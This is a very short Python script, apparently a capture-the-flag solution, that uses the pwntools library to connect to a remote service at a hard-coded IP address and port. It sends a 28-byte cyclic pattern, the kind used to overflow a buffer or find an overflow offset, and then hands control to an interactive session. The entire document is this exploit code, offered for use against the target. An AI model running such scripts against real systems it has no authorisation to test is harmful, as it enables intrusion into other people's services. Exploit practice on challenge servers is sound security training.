from pwn import *

context.log_level = "debug"

r = remote("61.147.171.105", 51985)
payload = cyclic(28)
r.send(payload)
r.interactive()
